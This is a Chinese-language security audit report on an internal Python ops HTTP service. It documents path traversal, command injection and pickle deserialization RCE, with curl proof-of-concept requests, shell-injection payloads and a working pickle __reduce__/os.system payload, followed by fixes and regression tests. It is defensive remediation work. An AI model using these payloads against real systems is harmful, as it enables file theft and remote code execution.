# 内部运维 HTTP 服务安全评估报告

- 评估对象：`tools/` 目录下的标准库运维 HTTP 服务（`server.py` / `handlers.py` / `security.py`）
- 评估日期：2026-11-13
- 运行环境：Windows 11 + Python 3.13（标准库，无第三方依赖）
- 评估方式：代码审计 + 本地真实起服务复现（所有 PoC 均已在本机跑通）
- 复现脚本：`tests/poc_ping_injection.py`、`tests/poc_pickle_rce.py`（攻击 PoC）；
  `tests/test_security.py`（修复后的安全回归测试）

## 一、结论摘要

共确认 **3 个可被远程利用的严重漏洞**，均可在默认配置（绑定 `127.0.0.1:8080`）下
被任何能访问该端口的一方利用。服务只监听回环地址不构成防护：本机任意进程、
浏览器页面（CSRF/DNS rebinding）、被钓鱼的内网同事都能发起请求。

| 编号 | 漏洞 | 位置 | 危害 | 严重级别 |
|---|---|---|---|---|
| V1 | 任意文件读取（路径穿越） | `tools/handlers.py` `handle_file`（原 27–39 行） | 读取服务器上服务账号可访问的任意文件 | 高 |
| V2 | OS 命令注入 | `tools/handlers.py` `handle_ping`（原 42–54 行） | 以服务账号权限执行任意系统命令 | 严重 |
| V3 | 不安全反序列化（pickle RCE） | `tools/handlers.py` `handle_load`（原 57–68 行） | 远程代码执行 | 严重 |

另有 1 处看起来危险但当前不可利用的代码（`eval`），以及若干深度防御加固，
见第四节。

---

## 二、漏洞详情、攻击路径与复现

### V1：`/file` 任意文件读取（路径穿越）

**位置**：`tools/handlers.py` `handle_file`，原代码：

```python
path = os.path.join(DATA_DIR, name)   # name 完全由查询参数控制，无任何校验
with open(path, "rb") as fh: ...
```

`security.py` 中的 `is_safe_filename` 只被 `import` 但从未调用（原第 7 行
`noqa: F401` 注释也写明"预留接入，当前未在读取流程调用"）；且该函数本身
也只挡绝对路径，不挡 `../`。`sanitize_path` 的单次 `replace("../", "")`
可被 `....//` 等嵌套写法绕过，同样未被调用。

**根因**：外部输入直接参与路径拼接，缺少"解析后路径必须位于 data 目录内"
的约束。

**攻击路径**：`os.path.join` 在遇到绝对路径（Windows 盘符 `C:/...`）时会
丢弃 `DATA_DIR`；相对路径 `../` 可逐级跳出 data 目录；URL 编码的
`..%2f`、反斜杠 `..%5c` 在 `parse_qs` 解码后同样生效。

**复现步骤与 PoC（修复前实测响应）**：

```bash
# 启动服务
python -m tools.server 8088

# 1) 相对穿越，读取源码
curl -s "http://127.0.0.1:8088/file?name=../security.py"
#   -> 200，返回 security.py 全文

# 2) URL 编码穿越
curl -s "http://127.0.0.1:8088/file?name=..%2fserver.py"
#   -> 200，返回 server.py 全文

# 3) 多级穿越读仓库外文件
curl -s "http://127.0.0.1:8088/file?name=../../README.md"
#   -> 200，返回仓库根 README

# 4) Windows 绝对路径（os.path.join 直接采用绝对路径）
curl -s -o /dev/null -w "%{http_code}\n" \
  "http://127.0.0.1:8088/file?name=C:/Windows/win.ini"
#   -> 200，返回 win.ini 内容（[fonts] 等）
```

实测以上 4 个请求在修复前全部返回 `200` 及目标文件内容。

**修复**（`tools/security.py` 新增 `is_safe_filename` / `resolve_inside`，
`handle_file` 强制接入）：

1. 文件名白名单：仅允许字母数字、`.`、`_`、`-`，拒绝任何 `/ \ :`、
   空字节、`.`/`..`、点开头文件名；
2. `realpath` 解析后用 `os.path.commonpath` 验证候选路径严格位于
   `data` 真实目录内，可同时挡住符号链接逃逸；
3. 只允许读取普通文件（`os.path.isfile`），目录/设备返回 404；
4. 非法文件名统一返回 `400 invalid name`。

**修复后复测**：上述 4 个攻击请求全部返回 `400`；`/file?name=report.txt`
与 `/file?name=notes.txt` 正常返回 `200` 与文件内容。

---

### V2：`/ping` OS 命令注入

**位置**：`tools/handlers.py` `handle_ping`，原代码：

```python
cmd = "ping -n 1 " + host          # host 为查询参数原值
result = subprocess.run(cmd, shell=True, capture_output=True)
```

**根因**：外部输入字符串拼接进命令并以 `shell=True` 执行，shell 元字符
（`&`、`|`、`&&`、`;`、反引号、`>` 等）不会被转义。

**攻击路径**：注入 `&` 可让 shell 在 ping 之后执行任意命令；`>` 可重定向
实现任意文件写；输出随 HTTP 响应直接回显，形成有回显 RCE。

**复现步骤与 PoC（修复前实测）**：

```bash
# 启动服务
python -m tools.server 8088

# 1) & 注入，回显标记（实测返回 PWNED_8842）
curl -s "http://127.0.0.1:8088/ping?host=127.0.0.1+%26+echo+PWNED_8842"
#   -> 200，响应体包含 PWNED_8842

# 2) 精确编码版本（脚本 tests/poc_ping_injection.py，实测输出）
python tests/poc_ping_injection.py 8088
#   pipe-ver / andand-set / and-echo / write-file 四种载荷
#   "and-echo" 响应中出现 PWNED_8842

# 3) 任意文件写：注入重定向，在服务工作目录落地文件
#    host = "x & echo PWNFILE_8842 > pwn_8842.txt"
#   -> 服务进程当前目录生成 pwn_8842.txt，内容 PWNFILE_8842（实测确认）
```

> 说明：本机 Git Bash 的 PATH 中没有 `ping.exe`，`|`/`&&` 形式因前导命令
> 解析失败被 cmd 短路；但 `&` 形式独立执行注入命令，已完整证明 RCE 与
> 任意文件写。在 `ping` 可正常执行的标准 Windows/Linux 环境下，
> `|`、`&&`、`;`、`` ` `` 等注入形式同样成立。

**修复**（`handle_ping` + `security.is_allowed_diag_host`）：

1. 主机白名单：仅允许 `localhost`、回环地址、RFC 私网地址及约定前缀
   （`10.`、`192.168.`），并用字符检查拒绝一切 shell 元字符与空白；
   公网地址（如 `8.8.8.8`）返回 `400 host not allowed`；
2. 用 `shutil.which("ping")` 取可执行文件全路径，以**参数列表**
   `subprocess.run([ping_bin, "-n", "1", host], shell=False)` 调用，
   `host` 永远只是 argv 的一个元素，操作系统不会再经过 shell 解析；
3. 增加 10 秒超时（`504 ping timeout`）与异常处理，避免诊断挂死。

**修复后复测**：7 种注入载荷（`&`、`|`、`&&`、`;`、`$()`、反引号等）
全部返回 `400` 且无标记文件产生；白名单内主机正常进入 ping 流程
（在含 System32 的标准 PATH 下实测返回真实 ping 结果 `200`）。

---

### V3：`/load` 不安全反序列化导致远程代码执行

**位置**：`tools/handlers.py` `handle_load`，原代码：

```python
blob = base64.b64decode(raw)
obj = pickle.loads(blob)          # 对网络输入做 pickle 反序列化
```

**根因**：`pickle.loads` 会在还原对象时调用 `__reduce__` 指定的任意可调用
对象。base64 只是传输编码，不提供任何安全边界——任何能向 `/load` POST
数据的人都能让服务执行任意 Python 代码。

**攻击路径**：构造 `__reduce__` 返回 `(os.system, (cmd,))` 的恶意对象，
pickle 序列化后 base64 编码 POST 给 `/load`，服务端反序列化即执行命令。

**复现步骤与 PoC（修复前实测）**：

```bash
python -m tools.server 8088
python tests/poc_pickle_rce.py 8088
```

`tests/poc_pickle_rce.py` 核心载荷：

```python
import os, pickle, base64
class RCE:
    def __reduce__(self):
        return (os.system, ("echo PWNED_PICKLE_8842 > %TEMP%/poc_pickle_8842.marker",))
payload = base64.b64encode(pickle.dumps(RCE()))
# POST 给 /load
```

修复前实测输出：

```
HTTP 200
body: restored: 0
marker exists: True
marker content: PWNED_PICKLE_8842
```

即恶意代码在服务端执行成功并落地标记文件。将 `os.system` 换成反弹 shell、
下载执行等载荷即可获得完整会话。

**修复**（`handle_load`）：

1. 删除 `pickle` 依赖，传输仍保持 base64（向后兼容传输形式），
   解码后用 `json.loads` 解析为 dict/list/数字/字符串等基础数据类型，
   JSON 解析不会执行代码；
2. `base64.b64decode(..., validate=True)` 严格校验，非法编码/非法 JSON
   统一返回 `400 bad cache payload`，且不再回显内部异常细节；
3. 请求体大小上限 1 MiB，超限返回 `413 payload too large`，防止内存型 DoS；
4. `Content-Length` 非法时返回 `400 bad content-length`。

> 接口契约说明：URL、HTTP 方法、成功响应结构（`restored: <repr>`）均保持
> 不变；唯一变化是缓存内容格式由 pickle 流改为 JSON。pickle 流本身无法在
> 不接受 RCE 的前提下安全解析，因此这是该漏洞唯一可行的修复方向，属必要的
> 数据格式变更，部署时需同步调整缓存生产方。

**修复后复测**：同一恶意 pickle 脚本实测 `HTTP 400 / bad cache payload /
marker exists: False`；合法 JSON 缓存
（`base64(json.dumps({"session":"ops","ids":[1,2]}))`）实测返回
`200 restored: {'session': 'ops', 'ids': [1, 2]}`。

---

## 三、不可利用 / 低风险项说明（避免误报）

### 3.1 `handle_diag` 中的 `eval`（当前不可利用，已做消除性加固）

原代码 `value = eval(token)` 中的 `token` 只可能来自服务端硬编码字典
`_DIAG_MODE`（值为 `"6 * 7"`、`"21 + 21"`），外部输入 `mode` 仅作为字典
key 查询，无法控制被 eval 的字符串。实测：

```bash
curl -s "http://127.0.0.1:8088/diag?mode=__import__('os').system('echo x')"
# -> 400 unknown mode（攻击串不是字典 key，直接被拒）
```

因此**不构成可利用漏洞**。但 eval 属于高危原语，未来一旦有人把外部输入
接入字典值就会立刻变成 RCE。本次将其改为直接返回硬编码整数结果
（`_DIAG_MODE = {"answer": 42, "double": 42}`），彻底移除 eval，
对外行为完全不变（`/diag?mode=answer` 仍返回 `42`）。

### 3.2 回环绑定本身不是鉴权（风险提示，非代码漏洞）

服务仅 `bind 127.0.0.1`，外部网络无法直连，但：本机任何低权限进程均可
访问；浏览器中的恶意网页可通过表单/fetch 向回环端口发请求（CSRF），
配合 DNS rebinding 还可绕过同源策略读取响应。本次三个漏洞在回环绑定下
依然可被这样触发。建议：不要在该服务上放置任何敏感凭据；如未来需要跨机
访问，应先加 token 鉴权与 TLS，再调整绑定地址，不要直接暴露到 `0.0.0.0`。

### 3.3 其他观察项

- `HTTPServer` 为单线程模型，慢请求/慢 ping 会阻塞其他请求（可用性问题，
  非远程代码执行类漏洞）。本次已给 ping 加超时缓解；如需并发可改用标准库
  `http.server.ThreadingHTTPServer`（接口不变，本次未改动以控制变更面）。
- 原 `/load` 把异常文本拼进响应（`bad cache payload: %s`），存在轻微信息
  泄露，修复后改为通用错误文案。

---

## 四、修复改动清单

| 文件 | 改动 |
|---|---|
| `tools/security.py` | 重写：`is_safe_filename` 字符白名单；新增 `resolve_inside`（realpath+commonpath 目录约束）；新增 `is_allowed_diag_host`（回环/内网白名单 + 元字符拦截）；移除有缺陷的 `sanitize_path` |
| `tools/handlers.py` | `handle_file` 接入目录约束并限定普通文件；`handle_ping` 改白名单 + `shell=False` 参数列表调用 + 超时；`handle_load` 去 pickle 改 JSON、加 1 MiB 上限与严格 base64 校验；`handle_diag` 移除 eval |
| `tests/test_security.py` | 新增：24 项回归（每个漏洞均含攻击失败用例 + 正常业务通过用例） |
| `tests/poc_ping_injection.py`、`tests/poc_pickle_rce.py` | 新增：可重复运行的漏洞复现 PoC 脚本 |
| `README.md` | 修正与实际不符的安全说明，补充真实防护边界与回环绑定风险提示 |

接口契约保持不变：路由、HTTP 方法、查询参数名、成功响应结构均未改动；
唯一的数据格式变化是 `/load` 的缓存内容由 pickle 改为 JSON（见 V3 说明）。

## 五、验证结果

```bash
python -m unittest discover -s tests -v
# Ran 24 tests ... OK   （含原 5 项功能测试，全部通过，未删改任何原测试）
```

- 原功能测试 `tests/test_basic.py`：5/5 通过，证明正常业务未被改坏；
- 新增安全测试 `tests/test_security.py`：19/19 通过，覆盖
  - 路径穿越 6 类载荷（相对/编码/多级/绝对盘符/UNC/空字节/点文件）全部 400；
  - 命令注入 7 类载荷全部 400 且无副作用文件，白名单主机正常、公网主机 400；
  - 恶意 pickle 返回 400 且标记文件不落地，合法 JSON 返回 200；
  - 超大载荷 413、非法 base64/JSON 400、diag 表达式注入 400；
- 真实服务端到端复测（独立端口 8099）：三个 PoC 对修复后服务全部攻击失败，
  对应正常请求全部成功（含标准 PATH 下的真实 ping 输出）。
